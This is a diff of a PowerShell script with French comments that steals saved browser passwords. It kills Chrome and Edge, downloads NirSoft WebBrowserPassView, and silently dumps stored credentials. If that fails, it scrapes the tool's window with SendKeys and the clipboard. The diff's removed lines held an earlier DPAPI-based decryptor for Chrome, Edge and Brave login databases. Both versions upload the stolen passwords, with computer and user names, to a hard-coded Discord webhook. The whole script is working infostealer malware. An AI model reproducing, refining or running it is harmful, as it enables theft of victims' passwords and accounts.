@@ -2,95 +2,100 @@ $wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3
 
 function Send-Discord { param([string]$m) try { irm $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType 'application/json' | Out-Null } catch {} }
 
-Send-Discord "🟢 **START** - $env:COMPUTERNAME | $env:USERNAME"
+Send-Discord "🟢 START - $env:COMPUTERNAME | $env:USERNAME"
 
-# Tuer navigateurs
-Get-Process chrome,msedge,brave,firefox -EA 0 | Stop-Process -Force -EA 0
-Start-Sleep 4
+# Tuer SEULEMENT Chrome et Edge (PAS BRAVE)
+Get-Process chrome,msedge -EA 0 | Stop-Process -Force -EA 0
+Start-Sleep 3
 
-Send-Discord "🔓 **Extracting passwords...**"
+Set-Location $env:TEMP
+Remove-Item wbpv*,passwords.txt -Recurse -Force -EA 0
 
-# Script PowerShell pur - AUCUN téléchargement nécessaire
-$code = @'
-Add-Type -AssemblyName System.Security
-function Get-Passwords {
-    param($dbPath, $browserName)
-    if (!(Test-Path $dbPath)) { return @() }
-    $tempDb = "$env:TEMP\ldb_$browserName"
-    Copy-Item $dbPath $tempDb -Force -EA 0
-    $results = @()
-    try {
-        [void][System.Reflection.Assembly]::LoadWithPartialName('System.Data.SQLite')
-        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
-        $conn.Open()
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
-        $reader = $cmd.ExecuteReader()
-        while ($reader.Read()) {
-            $url = $reader.GetString(0)
-            $user = $reader.GetString(1)
-            if (!$reader.IsDBNull(2)) {
-                $enc = New-Object byte[] $reader.GetBytes(2,0,$null,0,0)
-                $reader.GetBytes(2,0,$enc,0,$enc.Length) | Out-Null
-                try {
-                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                    $pass = [System.Text.Encoding]::UTF8.GetString($dec)
-                    $results += "[$browserName]`n$url`n$user : $pass`n"
-                } catch {}
-            }
-        }
-        $reader.Close()
-        $conn.Close()
-    } catch {}
-    Remove-Item $tempDb -Force -EA 0
-    return $results
-}
-
-$all = @()
-$all += Get-Passwords "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "CHROME"
-$all += Get-Passwords "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" "EDGE"
-$all += Get-Passwords "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" "BRAVE"
-return $all
-'@
+Send-Discord "📥 Downloading WebBrowserPassView..."
 
 try {
-    $passwords = Invoke-Expression $code
+    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
     
-    if ($passwords.Count -gt 0) {
-        $file = "$env:TEMP\pwds.txt"
-        "=== PASSWORDS ===`n$env:COMPUTERNAME | $env:USERNAME`n$(Get-Date)`n`n" | Out-File $file
-        $passwords | Out-File $file -Append
+    # Télécharger WebBrowserPassView (NirSoft)
+    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "wbpv.zip" -UseBasicParsing
+    
+    if (!(Test-Path "wbpv.zip")) {
+        Send-Discord "❌ Download failed"
+        exit
+    }
+    
+    Send-Discord "📦 Extracting..."
+    Expand-Archive "wbpv.zip" -DestinationPath "wbpv" -Force
+    
+    $exe = Get-ChildItem -Path "wbpv" -Filter "WebBrowserPassView.exe" -Recurse | Select -First 1
+    
+    if (!$exe) {
+        Send-Discord "❌ EXE not found"
+        exit
+    }
+    
+    Send-Discord "🔓 Extracting passwords..."
+    
+    # Méthode 1 : Export direct en TXT (comme ta méthode VBScript)
+    $outputFile = "$env:TEMP\passwords.txt"
+    Start-Process $exe.FullName -ArgumentList "/stext `"$outputFile`"" -Wait -WindowStyle Hidden
+    
+    Start-Sleep 3
+    
+    if (Test-Path $outputFile) {
+        $content = Get-Content $outputFile -Raw -EA 0
         
-        Send-Discord "📤 **Uploading $($passwords.Count) passwords...**"
-        curl.exe -F "file=@$file" -F "content=🔑 **$($passwords.Count) PASSWORDS**`n$env:COMPUTERNAME" $wh
-        Remove-Item $file -Force
-        Send-Discord "✅ **SUCCESS**"
+        if ($content -and $content.Length -gt 100) {
+            $count = ([regex]::Matches($content, "Password:")).Count
+            $size = [math]::Round((Get-Item $outputFile).Length / 1KB, 2)
+            
+            Send-Discord "📤 Found $count passwords - Uploading $size KB..."
+            
+            curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
+            
+            Send-Discord "✅ SUCCESS"
+        } else {
+            Send-Discord "⚠️ File created but empty or too small"
+        }
     } else {
-        Send-Discord "⚠️ **No passwords OR SQLite not available**"
-        Send-Discord "📥 **Trying alternative method...**"
+        Send-Discord "❌ Output file not created - trying GUI method..."
         
-        # Méthode alternative : raw binary parsing
-        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromePath) {
-            $temp = "$env:TEMP\chr_login"
-            Copy-Item $chromePath $temp -Force
-            $bytes = [IO.File]::ReadAllBytes($temp)
-            $text = [Text.Encoding]::ASCII.GetString($bytes)
+        # Méthode 2 : GUI + SendKeys (comme ton VBScript)
+        $proc = Start-Process $exe.FullName -PassThru
+        Start-Sleep 2
+        
+        # Charger l'assembly pour SendKeys
+        Add-Type -AssemblyName System.Windows.Forms
+        
+        # Sélectionner tout et copier
+        [System.Windows.Forms.SendKeys]::SendWait("^a")
+        Start-Sleep 200
+        [System.Windows.Forms.SendKeys]::SendWait("^c")
+        Start-Sleep 500
+        
+        # Récupérer le clipboard
+        $clipboard = Get-Clipboard -Raw
+        
+        # Fermer le programme
+        $proc | Stop-Process -Force -EA 0
+        
+        if ($clipboard) {
+            $outputFile | Out-Null
+            $clipboard | Out-File $outputFile -Encoding UTF8
             
-            # Extract URLs
-            $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-z]{2,}') | Select -Unique -First 30
+            $count = ([regex]::Matches($clipboard, "Password:")).Count
+            Send-Discord "📤 GUI method - Found $count passwords..."
             
-            $file = "$env:TEMP\urls.txt"
-            "=== SITES WITH SAVED PASSWORDS ===`n" | Out-File $file
-            $urls.Value | Out-File $file -Append
-            
-            curl.exe -F "file=@$file" -F "content=📋 **LOGIN SITES** - $env:COMPUTERNAME" $wh
-            Remove-Item $file,$temp -Force -EA 0
-            Send-Discord "✅ **Sent site list**"
+            curl.exe -F "file=@$outputFile" -F "content=🔑 **$count PASSWORDS (GUI)**`n$env:COMPUTERNAME" $wh
+            Send-Discord "✅ SUCCESS"
+        } else {
+            Send-Discord "❌ Clipboard empty"
         }
     }
+    
 } catch {
-    Send-Discord "❌ **Error:** $($_.Exception.Message)"
+    Send-Discord "❌ Error: $($_.Exception.Message)"
 }
 
-Send-Discord "🧹 **DONE**"
+Remove-Item wbpv*,passwords.txt -Recurse -Force -EA 0
+Send-Discord "🧹 DONE"
